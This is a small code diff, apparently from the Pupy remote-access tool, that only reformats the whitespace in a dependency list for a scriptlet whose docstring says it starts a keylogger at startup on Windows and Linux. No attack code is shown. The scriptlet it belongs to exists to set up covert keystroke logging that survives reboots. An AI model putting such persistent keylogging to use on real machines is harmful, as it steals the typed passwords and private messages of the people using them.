@@ -9,8 +9,8 @@ class ScriptletGenerator(Scriptlet):
     """ start the keylogger at startup """
 
     dependencies = {
-        'windows': [ 'pupwinutils.keylogger' ],
-        'linux': [ 'pupyps', 'display', 'keylogger' ]
+        'windows': ['pupwinutils.keylogger'],
+        'linux': ['pupyps', 'display', 'keylogger']
     }
     arguments={}
 
